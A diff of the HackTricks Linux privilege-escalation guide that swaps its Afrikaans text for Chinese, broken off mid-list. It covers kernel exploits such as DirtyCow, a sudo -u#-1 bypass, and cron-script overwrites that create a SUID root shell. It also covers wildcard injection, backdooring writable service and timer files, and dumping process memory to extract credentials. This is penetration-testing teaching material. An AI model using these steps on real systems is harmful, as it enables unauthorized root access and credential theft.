@@ -1,68 +1,68 @@
-# Linux Privilege Escalation
+# Linux 权限提升
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-## Stelselinligting
+## 系统信息
 
-### OS-inligting
+### 操作系统信息
 
-Kom ons begin om 'n bietjie kennis van die bedryfstelsel te verkry
+让我们开始了解运行的操作系统
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null # old, not by default on many systems
 cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
-### Pad
+### Path
 
-As jy **skrywe toestemmings op enige gids binne die `PATH`** veranderlike het, mag jy in staat wees om sommige biblioteke of binêre te kap:
+如果您**在`PATH`变量中的任何文件夹上具有写入权限**，您可能能够劫持某些库或二进制文件：
 ```bash
 echo $PATH
 ```
 ### Env info
 
-Interessante inligting, wagwoorde of API sleutels in die omgewingsveranderlikes?
+环境变量中有有趣的信息、密码或API密钥吗？
 ```bash
 (env || set) 2>/dev/null
 ```
 ### Kernel exploits
 
-Kontroleer die kernel weergawe en of daar 'n eksploitasie is wat gebruik kan word om voorregte te verhoog
+检查内核版本，看看是否有可以用来提升权限的漏洞
 ```bash
 cat /proc/version
 uname -a
 searchsploit "Linux Kernel"
 ```
-U kan 'n goeie lys van kwesbare kernels en sommige reeds **gecompileerde exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
-Ander webwerwe waar u sommige **gecompileerde exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
+您可以在这里找到一个好的易受攻击内核列表和一些已经**编译的漏洞利用**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)。\
+其他可以找到一些**编译的漏洞利用**的网站： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)， [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
-Om al die kwesbare kern weergawe uit daardie web te onttrek, kan u doen:
+要从该网站提取所有易受攻击的内核版本，您可以执行：
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
-Tools wat kan help om vir kernel exploits te soek is:
+可以帮助搜索内核漏洞的工具有：
 
 [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
 [linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
-[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer uit IN slagoffer, kyk slegs na exploits vir kernel 2.x)
+[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害者上执行，仅检查内核2.x的漏洞）
 
-Soek altyd **die kernel weergawe in Google**, dalk is jou kernel weergawe in 'n of ander kernel exploit geskryf en dan sal jy seker wees dat hierdie exploit geldig is.
+始终**在Google中搜索内核版本**，也许您的内核版本在某个内核漏洞中被写入，这样您就可以确定该漏洞是有效的。
 
 ### CVE-2016-5195 (DirtyCow)
 
-Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+Linux特权提升 - Linux内核 <= 3.19.0-73.8
 ```bash
 # make dirtycow stable
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
@@ -70,36 +70,36 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
 ```
-### Sudo weergawe
+### Sudo 版本
 
-Gebaseer op die kwesbare sudo weergawes wat verskyn in:
+基于出现在以下内容中的易受攻击的 sudo 版本：
 ```bash
 searchsploit sudo
 ```
-U kan nagaan of die sudo weergawe kwesbaar is deur hierdie grep te gebruik.
+您可以使用此 grep 检查 sudo 版本是否存在漏洞。
 ```bash
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
 #### sudo < v1.28
 
-Van @sickrov
+来自 @sickrov
 ```
 sudo -u#-1 /bin/bash
 ```
-### Dmesg-handtekeningverifikasie het misluk
+### Dmesg 签名验证失败
 
-Kontroleer **smasher2 box van HTB** vir 'n **voorbeeld** van hoe hierdie kwesbaarheid uitgebuit kan word
+检查 **HTB 的 smasher2 box** 以获取此漏洞可能被利用的 **示例**
 ```bash
 dmesg 2>/dev/null | grep "signature"
 ```
-### Meer stelselening
+### 更多系统枚举
 ```bash
 date 2>/dev/null #Date
 (df -h || lsblk) #System stats
 lscpu #CPU info
 lpstat -a 2>/dev/null #Printers info
 ```
-## Lys moontlike verdediging
+## 列举可能的防御措施
 
 ### AppArmor
 ```bash
@@ -130,86 +130,88 @@ fi
 (sestatus 2>/dev/null || echo "Not found sestatus")
 ```
 ### ASLR
+
+地址空间布局随机化
 ```bash
 cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 #If 0, not enabled
 ```
-## Docker Breek Uit
+## Docker Breakout
 
-As jy binne 'n docker-container is, kan jy probeer om daaruit te ontsnap:
+如果你在一个docker容器内，你可以尝试逃离它：
 
 {% content-ref url="docker-security/" %}
 [docker-security](docker-security/)
 {% endcontent-ref %}
 
-## Skywe
+## Drives
 
-Kontroleer **wat gemonteer en ongemonteer is**, waar en hoekom. As iets ongemonteer is, kan jy probeer om dit te monteer en na private inligting te kyk.
+检查**什么是挂载和未挂载的**，在哪里以及为什么。如果有任何未挂载的，你可以尝试挂载它并检查私人信息。
 ```bash
 ls /dev 2>/dev/null | grep -i "sd"
 cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
 #Check if credentials in fstab
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
 ```
-## Nuttige sagteware
+## 有用的软件
 
-Lys nuttige binaire lêers
+枚举有用的二进制文件
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
-Ook, kyk of **enige kompilator geïnstalleer is**. Dit is nuttig as jy 'n kernuitbuiting moet gebruik, aangesien dit aanbeveel word om dit op die masjien waar jy dit gaan gebruik (of op een soortgelyk) te compileer.
+此外，检查是否**安装了任何编译器**。如果您需要使用某些内核漏洞，这很有用，因为建议在您将要使用它的机器上（或类似的机器上）编译它。
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
-### Kwetsbare Sagteware Geïnstalleer
+### 安装的易受攻击软件
 
-Kontroleer die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar 'n ou Nagios-weergawe (byvoorbeeld) wat benut kan word om voorregte te verhoog…\
-Dit word aanbeveel om handmatig die weergawe van die meer verdagte geïnstalleerde sagteware te kontroleer.
+检查**已安装软件包和服务的版本**。可能有一些旧的Nagios版本（例如）可以被利用来提升权限…\
+建议手动检查更可疑的已安装软件的版本。
 ```bash
 dpkg -l #Debian
 rpm -qa #Centos
 ```
-As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk vir verouderde en kwesbare sagteware wat op die masjien geïnstalleer is.
+如果您可以通过SSH访问机器，您还可以使用**openVAS**检查机器上安装的过时和易受攻击的软件。
 
 {% hint style="info" %}
-_Nota dat hierdie opdragte 'n baie inligting sal toon wat meestal nutteloos sal wees, daarom word dit aanbeveel om sommige toepassings soos OpenVAS of soortgelyke te gebruik wat sal kyk of enige geïnstalleerde sagteware weergawe kwesbaar is vir bekende ontploffings_
+_请注意，这些命令将显示大量信息，其中大部分将是无用的，因此建议使用一些应用程序，如OpenVAS或类似工具，检查任何已安装的软件版本是否易受已知漏洞的攻击_
 {% endhint %}
 
-## Prosesse
+## 进程
 
-Kyk na **watter prosesse** uitgevoer word en kyk of enige proses **meer regte het as wat dit behoort** (miskien 'n tomcat wat deur root uitgevoer word?)
+查看**正在执行的进程**，并检查是否有任何进程**拥有超过应有的权限**（例如，可能是由root执行的tomcat？）
 ```bash
 ps aux
 ps -ef
 top -n 1
 ```
-Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
-Also **check your privileges over the processes binaries**, maybe you can overwrite someone.
+始终检查可能正在运行的 [**electron/cef/chromium 调试器**，您可以利用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测这些。\
+还要**检查您对进程二进制文件的权限**，也许您可以覆盖某个文件。
 
-### Process monitoring
+### 进程监控
 
-You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.
+您可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这对于识别频繁执行的易受攻击的进程或在满足一组要求时非常有用。
 
-### Process memory
+### 进程内存
 
-Some services of a server save **credentials in clear text inside the memory**.\
-Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
-However, remember that **as a regular user you can read the memory of the processes you own**.
+某些服务器服务在**内存中以明文保存凭据**。\
+通常，您需要**root 权限**才能读取属于其他用户的进程的内存，因此这通常在您已经是 root 并想要发现更多凭据时更有用。\
+但是，请记住，**作为普通用户，您可以读取您拥有的进程的内存**。
 
 {% hint style="warning" %}
-Let daarop dat die meeste masjiene **nie ptrace standaard toelaat nie**, wat beteken dat jy nie ander prosesse wat aan jou onprivileged gebruiker behoort, kan dump nie.
+请注意，如今大多数机器**默认不允许 ptrace**，这意味着您无法转储属于您无权限用户的其他进程。
 
-Die lêer _**/proc/sys/kernel/yama/ptrace\_scope**_ beheer die toeganklikheid van ptrace:
+文件 _**/proc/sys/kernel/yama/ptrace\_scope**_ 控制 ptrace 的可访问性：
 
-* **kernel.yama.ptrace\_scope = 0**: alle prosesse kan gedebug wees, solank hulle die dieselfde uid het. Dit is die klassieke manier waarop ptracing gewerk het.
-* **kernel.yama.ptrace\_scope = 1**: slegs 'n ouer proses kan gedebug wees.
-* **kernel.yama.ptrace\_scope = 2**: Slegs admin kan ptrace gebruik, aangesien dit die CAP\_SYS\_PTRACE vermoë vereis.
-* **kernel.yama.ptrace\_scope = 3**: Geen prosesse mag met ptrace getraceer word nie. Sodra dit gestel is, is 'n herbegin nodig om ptracing weer te aktiveer.
+* **kernel.yama.ptrace\_scope = 0**：所有进程都可以被调试，只要它们具有相同的 uid。这是 ptracing 工作的经典方式。
+* **kernel.yama.ptrace\_scope = 1**：只有父进程可以被调试。
+* **kernel.yama.ptrace\_scope = 2**：只有管理员可以使用 ptrace，因为它需要 CAP\_SYS\_PTRACE 能力。
+* **kernel.yama.ptrace\_scope = 3**：不允许使用 ptrace 跟踪任何进程。一旦设置，需要重启才能再次启用 ptracing。
 {% endhint %}
 
 #### GDB
 
-As jy toegang het tot die geheue van 'n FTP-diens (byvoorbeeld) kan jy die Heap kry en binne sy kredensiale soek.
+如果您可以访问 FTP 服务的内存（例如），您可以获取堆并在其凭据中进行搜索。
 ```bash
 gdb -p <FTP_PROCESS_PID>
 (gdb) info proc mappings
@@ -218,7 +220,7 @@ gdb -p <FTP_PROCESS_PID>
 (gdb) q
 strings /tmp/mem_ftp #User and password
 ```
-#### GDB Skrip
+#### GDB 脚本
 
 {% code title="dump-memory.sh" %}
 ```bash
@@ -235,7 +237,7 @@ done
 
 #### /proc/$pid/maps & /proc/$pid/mem
 
-Vir 'n gegewe proses-ID, **wys maps hoe geheue binne daardie proses se** virtuele adresruimte gemap is; dit wys ook die **toestemmings van elke gemapte streek**. Die **mem** pseudo-lêer **stel die proses se geheue self bloot**. Van die **maps** lêer weet ons watter **geheue streke leesbaar is** en hul offsets. Ons gebruik hierdie inligting om **in die mem-lêer te soek en al leesbare streke** na 'n lêer te dump.
+对于给定的进程 ID，**maps 显示该进程的虚拟地址空间内如何映射内存**；它还显示了**每个映射区域的权限**。**mem** 伪文件**暴露了进程的内存本身**。通过**maps** 文件，我们知道哪些**内存区域是可读的**及其偏移量。我们使用这些信息**在 mem 文件中查找并将所有可读区域转储到文件中**。
 ```bash
 procdump()
 (
@@ -250,14 +252,14 @@ rm $1*.bin
 ```
 #### /dev/mem
 
-`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kern se virtuele adresruimte kan verkry word met /dev/kmem.\
-Tipies is `/dev/mem` slegs leesbaar deur **root** en die **kmem** groep.
+`/dev/mem` 提供对系统 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。\
+通常，`/dev/mem` 仅可被 **root** 和 **kmem** 组读取。
 ```
 strings /dev/mem -n10 | grep -i PASS
 ```
-### ProcDump vir linux
+### ProcDump for linux
 
-ProcDump is 'n Linux-herinterpretasie van die klassieke ProcDump-gereedskap uit die Sysinternals-gereedskapstel vir Windows. Kry dit in [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
+ProcDump 是 Sysinternals 工具套件中经典 ProcDump 工具的 Linux 版本。可以在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
 ```
 procdump -p 1714
 
@@ -284,40 +286,40 @@ Press Ctrl-C to end monitoring without terminating the process.
 [20:20:58 - INFO]: Timed:
 [20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
 ```
-### Tools
+### 工具
 
-Om 'n prosesgeheue te dump, kan jy gebruik maak van:
+要转储进程内存，您可以使用：
 
 * [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
-* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig die root vereistes verwyder en die proses wat aan jou behoort dump
-* Skrip A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is vereis)
+* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_您可以手动删除root要求并转储由您拥有的进程
+* 来自 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 的脚本 A.5 (需要root)
 
-### Credentials from Process Memory
+### 从进程内存中获取凭据
 
-#### Manual example
+#### 手动示例
 
-As jy vind dat die authenticator proses aan die gang is:
+如果您发现身份验证进程正在运行：
 ```bash
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
 ```
-U kan die proses dump (sien vorige afdelings om verskillende maniere te vind om die geheue van 'n proses te dump) en soek na geloofsbriewe binne die geheue:
+您可以转储进程（请参阅之前的部分以找到转储进程内存的不同方法），并在内存中搜索凭据：
 ```bash
 ./dump-memory.sh 2027
 strings *.dump | grep -i password
 ```
 #### mimipenguin
 
-Die hulpmiddel [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **duidelike teks geloofsbriewe uit geheue** en uit 'n paar **bekende lêers** steel. Dit vereis wortelregte om behoorlik te werk.
+该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将 **从内存中窃取明文凭据** 和一些 **众所周知的文件**。它需要 root 权限才能正常工作。
 
-| Kenmerk                                           | Prosesnaam           |
-| ------------------------------------------------- | -------------------- |
-| GDM wagwoord (Kali Desktop, Debian Desktop)       | gdm-password         |
-| Gnome Sleutelhanger (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
-| LightDM (Ubuntu Desktop)                          | lightdm              |
-| VSFTPd (Aktiewe FTP Verbindinge)                   | vsftpd               |
-| Apache2 (Aktiewe HTTP Basiese Auth Sessions)         | apache2              |
-| OpenSSH (Aktiewe SSH Sessies - Sudo Gebruik)        | sshd:                |
+| 特性                                             | 进程名称             |
+| ------------------------------------------------ | -------------------- |
+| GDM 密码（Kali 桌面，Debian 桌面）               | gdm-password         |
+| Gnome 密钥环（Ubuntu 桌面，ArchLinux 桌面）     | gnome-keyring-daemon |
+| LightDM（Ubuntu 桌面）                           | lightdm              |
+| VSFTPd（活动 FTP 连接）                          | vsftpd               |
+| Apache2（活动 HTTP 基本认证会话）                | apache2              |
+| OpenSSH（活动 SSH 会话 - Sudo 使用）             | sshd:                |
 
 #### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
 ```bash
@@ -333,158 +335,158 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 # finding secrets
 # results in /tmp/tmp.o6HV0Pl3fe/results.txt
 ```
-## Geskeduleerde/Cron take
+## Scheduled/Cron jobs
 
-Kyk of enige geskeduleerde taak kwesbaar is. Miskien kan jy voordeel trek uit 'n skrip wat deur root uitgevoer word (wildekaart kwesbaarheid? kan lêers wat root gebruik, wysig? gebruik simboliese skakels? spesifieke lêers in die gids wat root gebruik, skep?).
+检查是否有任何计划任务存在漏洞。也许你可以利用由 root 执行的脚本（通配符漏洞？可以修改 root 使用的文件？使用符号链接？在 root 使用的目录中创建特定文件？）。
 ```bash
 crontab -l
 ls -al /etc/cron* /etc/at*
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 ```
-### Cron pad
+### Cron path
 
-Byvoorbeeld, binne _/etc/crontab_ kan jy die PAD vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
+例如，在 _/etc/crontab_ 中可以找到 PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
 
-(_Let op hoe die gebruiker "user" skryfregte oor /home/user het_)
+(_注意用户 "user" 对 /home/user 具有写权限_)
 
-As die root-gebruiker binne hierdie crontab probeer om 'n opdrag of skrip uit te voer sonder om die pad in te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
-Dan kan jy 'n root shell kry deur te gebruik:
+如果在这个 crontab 中，root 用户尝试执行某个命令或脚本而不设置路径。例如: _\* \* \* \* root overwrite.sh_\
+然后，您可以通过使用以下命令获得 root shell:
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 #Wait cron job to be executed
 /tmp/bash -p #The effective uid and gid to be set to the real uid and gid
 ```
-### Cron wat 'n skrip met 'n wildcard gebruik (Wildcard Injection)
+### Cron 使用带通配符的脚本（通配符注入）
 
-As 'n skrip wat deur root uitgevoer word 'n “**\***” binne 'n opdrag het, kan jy dit benut om onverwagte dinge te maak (soos privesc). Voorbeeld:
+如果由 root 执行的脚本在命令中包含“**\***”，您可以利用这一点来制造意想不到的事情（如权限提升）。示例：
 ```bash
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
-**As die wildcard voorafgegaan word deur 'n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **is nie).**
+**如果通配符前面有一个路径，比如** _**/some/path/\***_ **，那么它就不容易受到攻击（即使是** _**./\***_ **也不行）。**
 
-Lees die volgende bladsy vir meer wildcard eksploitasiemetodes:
+阅读以下页面以获取更多通配符利用技巧：
 
 {% content-ref url="wildcards-spare-tricks.md" %}
 [wildcards-spare-tricks.md](wildcards-spare-tricks.md)
 {% endcontent-ref %}
 
-### Cron-skrip oorskrywing en symlink
+### Cron 脚本覆盖和符号链接
 
-As jy **'n cron-skrip kan wysig** wat deur root uitgevoer word, kan jy baie maklik 'n shell kry:
+如果你 **可以修改一个由 root 执行的 cron 脚本**，你可以很容易地获得一个 shell：
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-As die skrip wat deur root uitgevoer word 'n **gids gebruik waar jy volle toegang het**, mag dit nuttig wees om daardie gids te verwyder en **'n simboolgids na 'n ander een te skep** wat 'n skrip wat deur jou beheer word, dien
+如果由 root 执行的脚本使用一个 **您拥有完全访问权限的目录**，那么删除该文件夹并 **创建一个指向另一个文件夹的符号链接**，该文件夹提供由您控制的脚本，可能会很有用。
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
-### Gereelde cron take
+### Frequent cron jobs
 
-Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy dit benut en priviligeë verhoog.
+您可以监控进程，以搜索每 1、2 或 5 分钟执行的进程。也许您可以利用这一点来提升权限。
 
-Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **te sorteer volgens minder uitgevoerde opdragte** en die opdragte wat die meeste uitgevoer is te verwyder, kan jy doen:
+例如，要**每 0.1 秒监控 1 分钟**，**按执行次数较少的命令排序**并删除执行次数最多的命令，您可以这样做：
 ```bash
 for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
 ```
-**Jy kan ook gebruik maak van** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses wat begin monitor en lys).
+**您还可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) （这将监视并列出每个启动的进程）。
 
-### Onsigbare cron take
+### 隐形的 cron 作业
 
-Dit is moontlik om 'n cronjob te skep **wat 'n terugkeerkarakter na 'n opmerking plaas** (sonder 'n nuwe reël karakter), en die cron taak sal werk. Voorbeeld (let op die terugkeerkarakter):
+可以创建一个 cron 作业 **在注释后添加回车符**（没有换行符），并且 cron 作业将正常工作。示例（注意回车符）：
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
-## Dienste
+## 服务
 
-### Skryfbare _.service_ lêers
+### 可写的 _.service_ 文件
 
-Kyk of jy enige `.service` lêer kan skryf, as jy kan, kan jy dit **wysig** sodat dit jou **terugdeur** **uitvoer** wanneer die diens **gestart**, **herstart** of **gestop** word (miskien moet jy wag totdat die masjien herbegin word).\
-Byvoorbeeld, skep jou terugdeur binne die .service lêer met **`ExecStart=/tmp/script.sh`**
+检查您是否可以写任何 `.service` 文件，如果可以，您 **可以修改它** 以便在服务 **启动**、**重启**或 **停止** 时 **执行** 您的 **后门**（也许您需要等到机器重启）。\
+例如，在 .service 文件中创建您的后门，使用 **`ExecStart=/tmp/script.sh`**
 
-### Skryfbare diens binaire
+### 可写的服务二进制文件
 
-Hou in gedagte dat as jy **skryfregte oor binaire** wat deur dienste uitgevoer word, het, jy dit kan verander vir terugdeure sodat wanneer die dienste weer uitgevoer word, die terugdeure uitgevoer sal word.
+请记住，如果您对服务执行的二进制文件具有 **写权限**，您可以将它们更改为后门，这样当服务重新执行时，后门将被执行。
 
-### systemd PAD - Relatiewe Pade
+### systemd PATH - 相对路径
 
-Jy kan die PAD wat deur **systemd** gebruik word, sien met:
+您可以使用以下命令查看 **systemd** 使用的 PATH：
 ```bash
 systemctl show-environment
 ```
-As jy vind dat jy kan **skryf** in enige van die vouers van die pad, mag jy in staat wees om **privileges te verhoog**. Jy moet soek na **relatiewe paaie wat gebruik word in dienskonfigurasie** lêers soos:
+如果您发现您可以在路径的任何文件夹中**写入**，您可能能够**提升权限**。您需要搜索**在服务配置**文件中使用的**相对路径**，例如：
 ```bash
 ExecStart=faraday-server
 ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
 ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
-Dan, skep 'n **uitvoerbare** lêer met die **selfde naam as die relatiewe pad-binary** binne die systemd PATH-gids waar jy kan skryf, en wanneer die diens gevra word om die kwesbare aksie uit te voer (**Begin**, **Stop**, **Herlaai**), sal jou **agterdeur uitgevoer word** (onbevoegde gebruikers kan gewoonlik nie dienste begin/stop nie, maar kyk of jy `sudo -l` kan gebruik).
+然后，在您可以写入的 systemd PATH 文件夹中创建一个 **可执行文件**，其 **名称与相对路径二进制文件相同**，当服务被要求执行脆弱操作（**启动**，**停止**，**重新加载**）时，您的 **后门将被执行**（普通用户通常无法启动/停止服务，但请检查您是否可以使用 `sudo -l`）。
 
-**Leer meer oor dienste met `man systemd.service`.**
+**通过 `man systemd.service` 了解更多关于服务的信息。**
 
-## **Timers**
+## **定时器**
 
-**Timers** is systemd eenheid lêers waarvan die naam eindig op `**.timer**` wat `**.service**` lêers of gebeurtenisse beheer. **Timers** kan as 'n alternatief vir cron gebruik word aangesien hulle ingeboude ondersteuning het vir kalender tyd gebeurtenisse en monotone tyd gebeurtenisse en kan asynchrone loop.
+**定时器** 是以 `**.timer**` 结尾的 systemd 单元文件，用于控制 `**.service**` 文件或事件。 **定时器** 可以作为 cron 的替代方案，因为它们内置支持日历时间事件和单调时间事件，并且可以异步运行。
 
-Jy kan al die timers opnoem met:
+您可以通过以下命令列出所有定时器：
 ```bash
 systemctl list-timers --all
 ```
-### Skryfbare timers
+### 可写定时器
 
-As jy 'n timer kan wysig, kan jy dit laat uitvoer van sommige bestaan van systemd.unit (soos 'n `.service` of 'n `.target`)
+如果您可以修改定时器，则可以使其执行某些 systemd.unit 的实例（如 `.service` 或 `.target`）
 ```bash
 Unit=backdoor.service
 ```
-In die dokumentasie kan jy lees wat die Eenheid is:
+在文档中，您可以阅读单位的定义：
 
-> Die eenheid om te aktiveer wanneer hierdie timer verstryk. Die argument is 'n eenheid naam, waarvan die agtervoegsel nie ".timer" is nie. As dit nie gespesifiseer is nie, is hierdie waarde die standaard vir 'n diens wat dieselfde naam as die timer eenheid het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die eenheid naam wat geaktiveer word en die eenheid naam van die timer eenheid identies genoem word, behalwe vir die agtervoegsel.
+> 当此计时器到期时要激活的单位。参数是单位名称，其后缀不是“.timer”。如果未指定，则此值默认为与计时器单位同名的服务，后缀除外。（见上文。）建议激活的单位名称和计时器单位的单位名称在后缀之外命名相同。
 
-Daarom, om hierdie toestemming te misbruik, moet jy:
+因此，要滥用此权限，您需要：
 
-* Vind 'n stelseldienste eenheid (soos 'n `.service`) wat **'n skryfbare binêre uitvoer**
-* Vind 'n stelseldienste eenheid wat **'n relatiewe pad uitvoer** en jy het **skryfregte** oor die **stelseldienste PAD** (om daardie uitvoerbare te verteenwoordig)
+* 找到某个 systemd 单元（如 `.service`），该单元正在 **执行一个可写的二进制文件**
